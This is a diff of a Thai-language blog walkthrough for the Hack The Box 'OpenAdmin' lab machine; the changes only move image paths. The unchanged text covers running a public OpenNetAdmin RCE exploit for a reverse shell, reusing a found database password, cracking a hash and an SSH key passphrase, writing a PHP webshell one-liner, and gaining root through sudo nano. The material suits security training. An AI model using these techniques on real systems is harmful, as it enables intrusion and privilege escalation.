@@ -7,7 +7,7 @@ tags: [writeup, walkthrough, htb, hackthebox, th, ภาษาไทย]
 
 สำหรับวันนี้ เรามาลองดูเครื่องที่ชื่อว่า OpenAdmin ใน Hack The Box กันนะครับ เครื่องนี้เป็นเครื่องระดับง่าย ที่มือใหม่ก็น่าจะพอเล่นกันผ่านได้โดยไม่ยากครับ
 
-{{< img src="/images/htb_openadmin/infocard.png">}}
+{{< img src="/images/writeup/htb_openadmin/infocard.png">}}
 
 <!--more-->
 
@@ -35,55 +35,55 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 เมื่อเข้ามาที่ port `80` ด้วย web browser เราจะเจอกับหน้า Apache2 Default Page อยู่ที่หน้าแรก
 
-{{< img src="/images/htb_openadmin/80_home.png">}}
+{{< img src="/images/writeup/htb_openadmin/80_home.png">}}
 
 เราสามารถใช้ `gobuster` เพื่อทำ directory fuzzing หา path ที่ซ่อนอยู่ จะเห็นว่าเราเจอ path ที่เข้าถึงได้ 3 อันจาก wordlist `big.txt`
 
-{{< img src="/images/htb_openadmin/80_gobuster.png">}}
+{{< img src="/images/writeup/htb_openadmin/80_gobuster.png">}}
 
 ลองเข้าไปดูแต่ละอัน ก็จะเจอกับหน้าเว็บที่เหมือนจะก็อปมาจาก template ดูไม่มีอะไรสำคัญเท่าไหร่
 
-{{< img src="/images/htb_openadmin/80_artwork.png">}}
+{{< img src="/images/writeup/htb_openadmin/80_artwork.png">}}
 
-{{< img src="/images/htb_openadmin/80_sierra.png">}}
+{{< img src="/images/writeup/htb_openadmin/80_sierra.png">}}
 
-{{< img src="/images/htb_openadmin/80_music.png">}}
+{{< img src="/images/writeup/htb_openadmin/80_music.png">}}
 
 แต่ในหน้า music เมื่อเราลองดูที่ปุ่ม Login จะเจอว่ามัน link ไปที่หน้า <http://10.10.10.171/ona> ที่มี `OpenNetAdmin 18.1.1` อยู่
 
-{{< img src="/images/htb_openadmin/80_ona.png">}}
+{{< img src="/images/writeup/htb_openadmin/80_ona.png">}}
 
 พอลองเอาไปหาใน Google จะเห็นว่ามีช่องโหว่ RCE อยู่
 
-{{< img src="/images/htb_openadmin/ona_rce.png">}}
+{{< img src="/images/writeup/htb_openadmin/ona_rce.png">}}
 
 ## Exploitation
 
 ลองโหลด exploit script จาก <https://raw.githubusercontent.com/amriunix/ona-rce/master/ona-rce.py> มาบนเครื่อง แล้วรันด้วย `python3 ona-rce.py exploit http://10.10.10.171/ona/` จะทำให้เราได้ reverse shell ของ user `www-data`
 
-{{< img src="/images/htb_openadmin/80_ona_rev.png">}}
+{{< img src="/images/writeup/htb_openadmin/80_ona_rev.png">}}
 
 เมื่อลองไล่ดูในไฟล์ของเว็บ จะเจอกับ config file นึง ที่มี database password `n1nj4W4rri0R!`
 
-{{< img src="/images/htb_openadmin/dbsetting.png">}}
+{{< img src="/images/writeup/htb_openadmin/dbsetting.png">}}
 
 จาก home directory เราจะ เห็น user อยู่ 2 account ได้แก่ `jimmy` และ `joanna` เมื่อลองเอา password ที่เจอก่อนหน้านี้มาใช้ จะพบว่า password นี้สามารถใช้ login เข้า user `jimmy` ได้
 
-{{< img src="/images/htb_openadmin/user.png">}}
+{{< img src="/images/writeup/htb_openadmin/user.png">}}
 
 พอเราได้ username และ password เราก็เปลี่ยนไปใช้ `ssh` เพื่อต่อไปยัง server ตรง ๆ ได้เลย ไม่ต้องผ่าน reverse shell
 
 พอลองไล่ดูไฟล์สักพัก ก็ไปเจอกับ directory นึงที่ชื่อว่า `/var/www/internal` ที่ `jimmy` เป็น owner
 
-{{< img src="/images/htb_openadmin/internal.png">}}
+{{< img src="/images/writeup/htb_openadmin/internal.png">}}
 
 ลองอ่านไฟล์ดู จะเห็นว่าหน้า `index.php` จะมี login form อยู่ โดย username ต้องเป็น `jimmy` และ `sha512` hash ของ password ต้องตรงกับที่ระบุไว้
 
-{{< img src="/images/htb_openadmin/internal_index.png">}}
+{{< img src="/images/writeup/htb_openadmin/internal_index.png">}}
 
 หน้า `main.php` จะมีการอ่านไฟล์ ssh private key ของ `joanna`
 
-{{< img src="/images/htb_openadmin/internal_main.png">}}
+{{< img src="/images/writeup/htb_openadmin/internal_main.png">}}
 
 พอเห็นแบบนี้ ก็พอจะเดาได้ว่าเราต้องหา password ที่ถูกต้องเพื่อ login เข้าไปในหน้า `main.php` แล้วเอา private key ของ `joanna` ออกมา แล้วใช้ key นั้นในการ `ssh` เข้าเป็น `joanna`
 
@@ -91,11 +91,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ได้ password เป็นคำว่า `Revealed`
 
-{{< img src="/images/htb_openadmin/internal_index_crack.png">}}
+{{< img src="/images/writeup/htb_openadmin/internal_index_crack.png">}}
 
 เราต้องรู้ก่อนว่าหน้าเว็บนี้ host อยู่บน port อะไร จากในตอนแรกจะเห็นว่า web server เป็น `Apache` สามารถไปดู config file ได้ใน `/etc/apache2/` จะเจอว่า `/var/www/internal` ถูก host อยู่บน port `52846`
 
-{{< img src="/images/htb_openadmin/internal_apache.png">}}
+{{< img src="/images/writeup/htb_openadmin/internal_apache.png">}}
 
 
 ....เอ้า? ไหนตอนแรกบอก `nmap` มาเจอแค่ `22` กับ `80` ไง? 
@@ -121,7 +121,7 @@ Click here to logout <a href="logout.php" tite = "Logout">Session
 
 ดังนั้น เราสามารถใช้ `curl` เพื่อเข้าถึงหน้าเว็บนั้นตรง ๆ จากบนเครื่องเป้าหมายได้เลย
 
-{{< img src="/images/htb_openadmin/internal_curlpriv.png">}}
+{{< img src="/images/writeup/htb_openadmin/internal_curlpriv.png">}}
 
 อ่าว แล้วแบบนี้ ถ้าเราอยากเข้าไปดูหน้าเว็บสวย ๆ ด้วย web browser ของเรา อยากลองกรอกฟอร์ม login ดี ๆ ไม่อยากจ้องแต่ code ของหน้าเว็บ จะทำยังไงดีล่ะ?
 
@@ -133,25 +133,25 @@ Click here to logout <a href="logout.php" tite = "Logout">Session
 
 ดังนั้นเราต้องใช้ command `ssh -L 80:127.0.0.1:52846 jimmy@10.10.10.171`
 
-{{< img src="/images/htb_openadmin/internal_localforward.png">}}
+{{< img src="/images/writeup/htb_openadmin/internal_localforward.png">}}
 
 จากนั้น เราจะสามารถใช้ web browser บนเครื่องเรา เข้าไปที่ port `80` บนเครื่องเราเอง ตัว request จะถูก forward ไปที่เว็บปลายทาง ทำให้เราสามารถเข้าถึงหน้าเว็บได้
 
-{{< img src="/images/htb_openadmin/internal_localhost.png">}}
+{{< img src="/images/writeup/htb_openadmin/internal_localhost.png">}}
 
 ลอง login ด้วย `jimmy:Revealed`
 
-{{< img src="/images/htb_openadmin/internal_login.png">}}
+{{< img src="/images/writeup/htb_openadmin/internal_login.png">}}
 
 วิธีนี้ ทำให้เราเข้าถึง private key ของ `joanna` ได้ผ่าน web browser
 
-{{< img src="/images/htb_openadmin/internal_privkey.png">}}
+{{< img src="/images/writeup/htb_openadmin/internal_privkey.png">}}
 
 พอได้ key มาแล้ว ให้เรา copy มาไว้ในไฟล์บนเครื่องเราได้เลย โดยเราตั้งชื่อว่า `privkey` จากนั้นเราสามารถใช้ key เพื่อ `ssh` ไปยังเครื่องเป้าหมายด้วย user `joanna` ด้วย command `ssh -i privkey joanna@10.10.10.171` ได้เลย... รึเปล่า?
 
 **ยัง! ต้องมี passphrase สำหรับใช้ key อีก!**
 
-{{< img src="/images/htb_openadmin/joanna_pass.png">}}
+{{< img src="/images/writeup/htb_openadmin/joanna_pass.png">}}
 
 แล้วเราจะหา passphrase มาจากไหนล่ะ? มาลอง crack ด้วย `rockyou.txt` โดยใช้ `john`
 
@@ -159,21 +159,21 @@ Click here to logout <a href="logout.php" tite = "Logout">Session
 
 **และแล้วเราก็ได้ passphrase!**
 
-{{< img src="/images/htb_openadmin/internal_privkey_crack.png">}}
+{{< img src="/images/writeup/htb_openadmin/internal_privkey_crack.png">}}
 
 ในที่สุด เราก็จะ `ssh` ไปที่เครื่องปลายทางได้ด้วย private key ที่ได้มา และใช้ passphrase เป็น `bloodninjas`
 
-{{< img src="/images/htb_openadmin/joanna_ssh.png">}}
+{{< img src="/images/writeup/htb_openadmin/joanna_ssh.png">}}
 
 ### Another Solution
 
 มีอีกวิธีที่เราใช้ในการเข้าถึง `joanna` ได้ ถ้ากลับไปดู เราจะเห็นว่า `jimmy` เป็น owner ของ directory `/var/www/internal` เท่ากับว่าเราสามารถเขียนไฟล์ หรือแก้ไฟล์ในนี้ได้เลย
 
-{{< img src="/images/htb_openadmin/internal.png">}}
+{{< img src="/images/writeup/htb_openadmin/internal.png">}}
 
 เราสามารถเขียน PHP webshell ง่าย ๆ ไว้ในนั้น โดยใช้ command `echo '<?php echo shell_exec($_GET["cmd"]); ?>' > cmd.php` จากนั้นเราก็ใช้ `curl` เพื่อรัน command ด้วยสิทธิ์ของ `joanna` ได้เลย โดยใช้ command `curl localhost:52846/cmd.php?cmd=[COMMAND]`
 
-{{< img src="/images/htb_openadmin/internal_joannacmd.png">}}
+{{< img src="/images/writeup/htb_openadmin/internal_joannacmd.png">}}
 
 เราอาจใช้วิธีนี้ในการดึง private key ออกมา หรือเอา public key ของเครื่องเราไปใส่ไว้ใน `/home/joanna/.ssh/authorized_keys` ก็ได้
 
@@ -181,24 +181,24 @@ Click here to logout <a href="logout.php" tite = "Logout">Session
 
 การ escalate บนเครื่องนี้ค่อนข้างจะตรงไปตรงมา ลองใช้ `sudo -l` จะเห็นว่าเรารัน `nano` ด้วยสิทธิ์ `root` ได้โดยไม่ต้องใช้ password
 
-{{< img src="/images/htb_openadmin/joanna_nano.png">}}
+{{< img src="/images/writeup/htb_openadmin/joanna_nano.png">}}
 
 จากเว็บ <https://gtfobins.github.io/gtfobins/nano/> เราจะเห็นว่าเราสามารถใช้ `sudo` กับ `nano` เพื่อ escalate เป็น `root` ได้เลย
 
-{{< img src="/images/htb_openadmin/gtfobins.png">}}
+{{< img src="/images/writeup/htb_openadmin/gtfobins.png">}}
 
 ลองรัน `nano` ด้วย `sudo`
 
-{{< img src="/images/htb_openadmin/priv1.png">}}
+{{< img src="/images/writeup/htb_openadmin/priv1.png">}}
 
 กด `Ctrl-R` แล้วกด `Ctrl-X`
 
-{{< img src="/images/htb_openadmin/priv2.png">}}
+{{< img src="/images/writeup/htb_openadmin/priv2.png">}}
 
 พิมพ์ `reset; sh 1>&0 2>&0` จากนั้นกด `Enter`
 
-{{< img src="/images/htb_openadmin/priv3.png">}}
+{{< img src="/images/writeup/htb_openadmin/priv3.png">}}
 
 กด `Enter` สักสองสามทีเพื่อเคลียร์จอ จะเห็นว่าเราได้ยกสิทธิ์ตัวเองเป็น `root` เรียบร้อย
 
-{{< img src="/images/htb_openadmin/root.png">}}
+{{< img src="/images/writeup/htb_openadmin/root.png">}}
